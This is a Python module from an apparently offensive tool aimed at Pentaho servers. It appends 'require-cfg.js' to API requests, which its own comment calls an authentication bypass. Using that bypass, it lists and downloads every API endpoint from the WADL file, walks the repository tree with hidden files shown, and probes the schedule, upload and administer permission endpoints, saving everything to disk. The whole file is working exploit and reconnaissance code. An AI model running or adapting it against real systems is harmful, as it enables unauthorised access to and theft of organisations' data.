#!/usr/bin/python3
import urllib.parse
import xml.etree.ElementTree as ET
import traceback
from colorama import Fore
from colorama import init
from pathlib import Path

# Colorama
init(autoreset=True)

from modules import config

"""

Put together all functions that do recurisive work

"""

def api():
	"""
	Get all valid API endpoints
	
	TODO:
	large responses should be saved as separate files
	"""
	
	# Creating API directory if does not exist
	Path(f'{config.dirname}/api').mkdir(parents=True, exist_ok=True)
	
	
	response = config.session.get(f"{config.pentaho_path}/api/application.wadl?require-cfg.js", proxies=config.proxies)
	root = ET.fromstring(response.text)
	
	# saving the application.wadl file
	f=open(f'{config.dirname}/api/application.wadl', 'w+')
	f.write(response.text)
	f.close()
	
	resources = root.findall('{http://wadl.dev.java.net/2009/02}resources')
	
	for r in resources:
		# base url not reliable for HTTP / HTTPS
		#base_url = r.attrib['base']
		childs = r.findall('{http://wadl.dev.java.net/2009/02}resource')
		for child in childs:
			path = child.attrib['path']
			childs2 = child.findall('{http://wadl.dev.java.net/2009/02}resource')
			for child2 in childs2:
				path2 = child2.attrib['path']
				
				url = '{}/api/{}{}'.format(config.pentaho_path, path, path2)
				
				# I know, dirty... but works. sometimes there is a double //,  sometimes not..
				url = url.replace('://', ':}}')
				url = url.replace('//', '/')
				url = url.replace(':}}', '://')
				url = url+"?require-cfg.js"
				
				try:
					resp = config.session.get(url, proxies=config.proxies)
					if resp.status_code == 200:
						print (url)
						print ('--')
						print (resp.text)
						print ('--')
						
						endpoint = url.replace(config.pentaho_path+ '/api/', '').replace('?require-cfg.js', '').replace('.', '_').replace('/', '_').replace(':', '_')
						# saving the API output
						f=open(f'{config.dirname}/api/{endpoint}.log', 'w+', encoding='utf-8')
						f.write(resp.text)
						f.close()
				except Exception as fail:
					print("connection problem to API endpoint")
					print (fail)
					tb = traceback.format_exc()
					print (tb)

def repository_files(data):
	"""
	List all available files from repository

	NOTE:
	&require-cfg.js is added at the end of every API call as an authentication bypass ( see CVE-XXX)
	
	TODO:
	config.path_store will be filled once, than it is inpossible to call the command again, as all the paths have been exausted.
	
	"""
	if config.is_anon:
		return
	
	# Replace backslashes with semicolon in the provided paths
	path = urllib.parse.quote(data.replace('/', ':'))

	# 
	files = config.session.get(f"{config.pentaho_path}/api/repo/files/{path}/children?showHidden=true&filter=*%7CFOLDERS&require-cfg.js", proxies=config.proxies)
	if files.status_code == 200:
		iter = 'repositoryFileDto'
	else:
		files = config.session.get(f"{config.pentaho_path}/api/repo/files/{path}/tree?depth=-1&showHidden=true&filter=*%7CFILES&require-cfg.js", proxies=config.proxies)
		if files.status_code != 200:
			return
		iter = 'file'
	root = ET.fromstring(files.text)
	checker = root.find(iter)
	if iter == 'repositoryFileDto' and checker is None:
		files = config.session.get(f"{config.pentaho_path}/api/repo/files/{path}/tree?depth=-1&showHidden=true&filter=*%7CFOLDERS&require-cfg.js", proxies=config.proxies)
		iter = 'file'
		root = ET.fromstring(files.text)
	
	for r in root.iter(iter):
		new_path = r.find('path').text
		if new_path in config.path_store:
			pass
		else:
			config.path_store.append(new_path)
			if r.find('folder').text == 'true':
				print(f'{Fore.MAGENTA}{new_path}')
				repository_files(new_path)
			else:
				print(f'{Fore.GREEN}{new_path}')
	# Creating API directory if does not exist
	Path(f'{config.dirname}/repository').mkdir(parents=True, exist_ok=True)
	
	# saving the application.wadl file
	f=open(f'{config.dirname}/repository/file_list.txt', 'w+')
	for file in config.path_store:
		f.write(file+"\n")
	f.close()
	

def permissions ():
	#/api/scheduler/canSchedule
	endpoints = {'Schedule': '/api/scheduler/canSchedule',
					'Create' : '/api/repo/files/canCreate',
					'Administer': '/api/repo/files/canAdminister',
					'RepoDownload': '/api/repo/files/canDownload',
					'RepoCreate': '/api/repo/files/canCreate',
					'RepoUpload': '/api/repo/files/canUpload',
				}
	
	# saving into a 
	f=open(f'{config.dirname}/permissions.txt', 'w+')

	for property in endpoints:
		response = config.session.get(f"{config.pentaho_path}{endpoints[property]}", proxies=config.proxies)
		if 'false' in response.text or response.status_code != 200:
			print (f"{Fore.RED}{property}")
			f.write(f"{property} FALSE\n")
		else:
			print (f"{Fore.GREEN}{property}")
			f.write(f"{property} TRUE\n")
	f.close()